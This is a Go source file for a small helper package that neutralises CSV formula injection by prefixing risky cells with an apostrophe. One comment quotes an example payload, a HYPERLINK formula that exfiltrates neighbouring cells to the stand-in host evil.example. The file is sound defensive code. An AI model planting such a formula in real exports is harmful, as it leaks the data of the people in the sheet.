// Package csvsafe protects CSV exports from formula/CSV injection (§ code
// review finding #6). Any column populated with text an OUTSIDE party
// controls (mis. a customer's own name typed at registrasi/guest checkout)
// must be passed through Field before being written as a CSV cell — a value
// like `=HYPERLINK("https://evil.example/?d="&A2&B2,"klik")` is silently
// interpreted as a live formula by Excel/Sheets/LibreOffice when the export
// is opened, and can be used to exfiltrate data from OTHER cells/rows in the
// same sheet.
//
// Shared across every module that exports user-controlled text to CSV
// (auth/service/customer_csv.go, order/handler/recap_handler.go's customer
// name column, and any future export) — one helper, one place to fix if the
// mitigation ever needs to change, instead of the same bug being
// independently (mis)handled per module.
package csvsafe

import "strings"

// triggerChars — characters that, as the FIRST character of a cell, cause
// spreadsheet software to interpret the cell as a formula/command instead of
// literal text. This is the standard OWASP CSV-injection trigger set.
const triggerChars = "=+-@\t\r"

// Field neutralizes formula injection in a single CSV cell value: if s
// starts with a formula-trigger character, it's prefixed with a leading `'`
// so spreadsheet software renders it as literal text instead of evaluating
// it. Values that don't start with a trigger character are returned
// unchanged (no unnecessary mutation of ordinary data).
func Field(s string) string {
	if s == "" {
		return s
	}
	if strings.ContainsRune(triggerChars, rune(s[0])) {
		return "'" + s
	}
	return s
}
